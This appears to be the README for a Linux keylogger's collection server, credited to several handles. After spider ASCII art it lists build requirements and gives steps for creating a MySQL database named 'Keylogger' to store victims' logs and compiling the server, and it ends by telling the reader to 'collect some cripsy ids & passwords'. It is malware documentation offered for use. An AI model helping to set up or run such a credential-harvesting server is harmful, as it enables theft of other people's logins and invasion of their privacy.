.[SPIDER SERVER FOR LINUX].
-	 Version 1.0	  -
---------------------------

            $           $
      $    $$           $$    $
     $$    $$            $$   $$
     $$   $$             $$   $$
    $$    $$    $   $    $$    $$
    $$    $$    $$S$$    $$    $$
    $$   $$$   $$$P$$$   $$$   $$
   $$$   $$$   $$$I$$$   $$$   $$$
   $$$   $$$   $$$D$$$   $$$   $$$
   $$$   $$$    $$E$$    $$$   $$$
   $$$$   $$$   $$R$$   $$$   $$$$
    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$
           $$$$$$$$$$$$$$
            $$$SPIDER$$$
      $$$$$$$$$$$$$$$$$$$$$$$$$
  $$$$$$$$$$ $$$$$$$$$$$ $$$$$$$$$$
 $$$$   $$$  $$$$$S$$$$$  $$$   $$$$
 $$$    $$$  $$$$$P$$$$$  $$$    $$$
  $$$   $$$  $$$$$I$$$$$  $$$   $$$
  $$$   $$$  $$$$$D$$$$$  $$$   $$$
   $$    $$   $$$$E$$$$   $$    $$
   $$$   $$   $$$$R$$$$   $$   $$$
    $$    $$   $$$$$$$   $$    $$
     $$    $    $$$$$    $    $$
      $     $           $     $
       $    $           $    $


REQUIREMENTS
-------------
	We recommend that users upgrade or install C++ BOOST libraries & libmysqlclient-devel libraries,
	otherwise they won't be able to install the server. Also, ensure that you have installed a g++ version
	that compiles C++11
	Also, you might need to configure your MySQL/MariaDB server so that the program may easily access it
	via root user.

INSTALLATION
------------
	If you are installing the server for the first time, launch the shell script db.sh located in scripts
	dir that way :
	    $> scripts/db.sh
	This script will start your sql server as root user and will use a .sql file that will set a new DB
	named Keylogger, which will contain all the clients logs in 6 tables.
	Once it is done, just run "make" to compile the server's binary :
	    $> make re

	If you've followed these instructions without any issue : YOU MADE IT ! You have just installed the
	keylogger's server. Get ready to collect some cripsy ids & passwords ! :D

*_________________________________________*
|					  |
| © FLATCH, KoRnX, Zak & ChantillyPeach   |
*_________________________________________*
